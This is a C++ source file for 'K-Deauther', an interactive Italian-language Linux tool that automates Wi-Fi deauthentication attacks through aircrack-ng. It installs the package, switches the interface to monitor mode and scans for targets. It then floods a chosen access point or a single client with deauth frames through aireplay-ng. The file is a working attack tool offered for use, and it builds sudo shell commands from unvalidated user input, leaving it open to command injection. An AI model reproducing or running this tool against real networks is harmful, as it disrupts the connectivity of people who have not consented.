#include <iostream>
//per usare la funzione system()
#include <cstdlib>
//per usare la funzione sleep()
#include <unistd.h>
//per la funzione to_string
#include <string>

using namespace std;

//dichiaro le funzioni
string setup();
void mode_monitor(string scheda_wifi);
void deautenticazione(string scheda_wifi);
void deautenticazione_dispositivo(string bssid, string scheda_wifi);
void deautenticazione_wifi(string bssid, string scheda_wifi);

//programmo la funzione setup
string setup()
{
    //introduzione alla configurazione della scheda wifi
    cout << "[*] Avvio configurazione dell'interfaccia wireless." << endl;
    cout << "[*] Elenco delle interfacce disponibili in corso..." << endl;
    cout << "[*] Attendere 5 secondi per la scansione." << endl << endl;
    //aspetto 5 secondi
    sleep(5);
    //eseguo il comando iwconfig sul terminale per stampare a schermo l'interfaccia grafica
    system("iwconfig");
    //aspetto altri 5 secondi
    sleep(5);

    //faccio inserire all'utente l'interfaccia che vuole usare
    cout << "[>] Inserire il nome dell'interfaccia da utilizzare (es. wlan0): ";
    string scheda_wifi;
    cin >> scheda_wifi;

    //controllo se aircrack-ng è installato
    cout << "[*] Verifica della presenza del pacchetto 'aircrack-ng'..." << endl;
    cout << "[*] Installazione automatica in corso (se necessario)..." << endl;
    sleep(5);
    system("clear");
    system("sudo apt install aircrack-ng -y");
    system("clear");

    //ora uso airmon-ng check kill per terminare le interferenze
    cout << "[*] Terminazione dei processi in conflitto con modalità monitor..." << endl;
    sleep(5);
    system("sudo airmon-ng check kill");

    //passo la variabile scheda wifi al main che poi la passera' alla funzione mode_monitor
    return scheda_wifi;
}

//programmo la funzione mode_monitor
void mode_monitor(string scheda_wifi)
{
    //imposto la scheda in monitor mode
    cout << "[*] Configurazione dell'interfaccia in modalità monitor in corso..." << endl;
    sleep(5);
    system(("sudo airmon-ng start " + scheda_wifi ).c_str());
}

//programmo la funzione deautenticazione
void deautenticazione(string scheda_wifi)
{
    //faccio controllare all'utente se tutto ha funzionato
    cout << "[?] Verifica che l'interfaccia sia in modalità monitor ('Mode:Monitor'). Confermi? (s/n): ";
    sleep(5);
    system("iwconfig");
    char risposta_mode;
    cin >> risposta_mode;

    //secondo l'utente la mode e' monitor
    if (risposta_mode == 's')
    {
        cout << "[+] Modalità monitor confermata. Procedura in corso..." << endl;

        //controllo se ha cambiato nome
        cout << "[?] L'interfaccia ha cambiato nome dopo l'attivazione della modalità monitor? (s/n): ";
        char risposta_nome;
        cin >> risposta_nome;
        if (risposta_nome == 's')
        {
            cout << "[>] Inserisci il nuovo nome dell'interfaccia (es. wlan0mon): ";
            string scheda_wifi_monitor;
            cin >> scheda_wifi_monitor;
            scheda_wifi = scheda_wifi_monitor;
        }

        //chiedo per quanto tempo scannerizzare
        cout << "[>] Specificare la durata della scansione delle reti Wi-Fi (in secondi): ";
        int tempo;
        cin >> tempo;

        //scannerizzo le wifi tramite airodump-ng per tot secondi
        cout << "[*] Avvio scansione reti Wi-Fi..." << endl;
        sleep(5);
        system(("xterm -hold -e sudo timeout " + to_string(tempo) + " airodump-ng " + scheda_wifi).c_str());
        sleep(5);

        //raccolgo bssid e canale
        cout << "[>] Inserisci BSSID e canale della rete target (es. 00:11:22:33:44:55 6): ";
        string bssid;
        int canale;
        cin >> bssid >> canale;

        system("clear");

        //vado a scannerizzare la rete in questione
        cout << "[*] Scansione dettagliata della rete selezionata in corso..." << endl;
        cout << "[!] Se vuoi colpire un solo dispositivo, prendi nota di BSSID e STATION." << endl;

        //chiedo per quanto tempo scannerizzare la rete selezionata
        cout << "[>] Specificare la durata della scansione dettagliata (in secondi): ";
        int tempo2;
        cin >> tempo2;

        cout << "[*] Avvio scansione..." << endl;
        sleep(5);
        system(("xterm -hold -e sudo timeout " + to_string(tempo2) + " sudo airodump-ng --bssid " + bssid + " --channel " + to_string(canale) + " " + scheda_wifi).c_str());

        //chiedo all'utente cosa vuole fare
        cout << "[?] Seleziona modalità attacco: 1 = dispositivo specifico, 2 = intera rete: ";
        int scelta;
        cin >> scelta;

        if (scelta == 1)
        {
            deautenticazione_dispositivo(bssid, scheda_wifi);
        }
        else if (scelta == 2)
        {
            deautenticazione_wifi(bssid, scheda_wifi);
        }
    }
    //secondo l'utente la mode non e' monitor
    else if (risposta_mode == 'n')
    {
        //chiedo se vuole riprovare
        cout << "[?] Vuoi riprovare ad attivare la modalità monitor? (s/n): ";
        char riprova;
        cin >> riprova;

        if (riprova == 's')
        {
            cout << "[*] Riavvio della configurazione della modalità monitor..." << endl;
            sleep(5);
            //chiamo la funzione mode_monitor per riprovare 
            mode_monitor(scheda_wifi);
        }
        else
        {
            //interrompo tutto
            cout << "[x] Terminazione in corso..." << endl;
            system(("sudo airmon-ng stop " + scheda_wifi).c_str());
            sleep(10);
            cout << "[✓] Grazie per aver utilizzato K-Deauther!" << endl;
            exit(0);
        }
    }
}

//programmo la funzione che deautentica un solo dispositivo
void deautenticazione_dispositivo(string bssid, string scheda_wifi)
{
    cout << "[>] Inserisci la STATION del dispositivo target: ";
    string stazione;
    cin >> stazione;

    cout << "[>] Durata dell'attacco (in secondi): ";
    int tempo3;
    cin >> tempo3;

    cout << "[*] Avvio attacco di deautenticazione verso il dispositivo selezionato..." << endl;
    sleep(5);
    system(("xterm -hold -e sudo timeout " + to_string(tempo3) + " sudo aireplay-ng --deauth 100000 -a " + bssid + " -c " + stazione + " " + scheda_wifi).c_str());

    //il programma e' finito
    system(("sudo airmon-ng stop " + scheda_wifi).c_str());
    sleep(10);
    cout << "[✓] Attacco completato. Grazie per aver utilizzato K-Deauther!" << endl;
    exit(0);
}

//programmo la funzione che deautentica tutta la wifi
void deautenticazione_wifi(string bssid, string scheda_wifi)
{
    cout << "[>] Durata dell'attacco contro l'intera rete (in secondi): ";
    int tempo4;
    cin >> tempo4;

    cout << "[*] Avvio attacco di deautenticazione verso la rete selezionata..." << endl;
    sleep(5);
    system(("xterm -hold -e sudo timeout " + to_string(tempo4) + " sudo aireplay-ng --deauth 100000 -a " + bssid + " " + scheda_wifi).c_str());

    //il programma e' finito
    system(("sudo airmon-ng stop " + scheda_wifi).c_str());
    sleep(10);
    cout << "[✓] Attacco completato. Grazie per aver utilizzato K-Deauther!" << endl;
    exit(0);
}

int main()
{
    //introduzione del progetto
    cout << "╔═════════════════════════════════════════════════════╗" << endl;
    cout << "║             K-Deauther - Terminal Edition           ║" << endl;
    cout << "║   Progetto: Deautenticatore Wi-Fi per Linux (CLI)   ║" << endl;
    cout << "╚═════════════════════════════════════════════════════╝" << endl << endl;

    cout << "[*] Requisiti: interfaccia wireless compatibile con monitor mode." << endl;
    cout << "[*] Sistema richiesto: Linux o shell compatibile (Bash/Zsh/WSL)." << endl << endl;

    //chiedo all'utente se vuole continuare e controllo la risposta
    cout << "[?] Vuoi procedere con l'esecuzione? (s/n): ";
    char risposta;
    cin >> risposta;

    //se la risposta è s
    if (risposta == 's')
    {
        //continuo il programma
        cout << "[*] Avvio della procedura..." << endl << endl;
        //funzione dove andremo a impostare la scheda wifi in monitor mode
        string scheda_wifi = setup();
        //funzione che imposta la mode a monitor
        mode_monitor(scheda_wifi);
        //funzione che inizia l'attacco
        deautenticazione(scheda_wifi);
    }
    //se la risposta è n
    else if (risposta == 'n')
    {
        //chiudo il programma
        cout << "[x] Uscita dal programma. Nessuna operazione eseguita." << endl;
        return 0;
    }
    //se la risposta non è né sì né no
    else
    {
        cout << "[!] Input non valido. Inserire 's' per continuare o 'n' per uscire." << endl;
        return 0;
    }
}
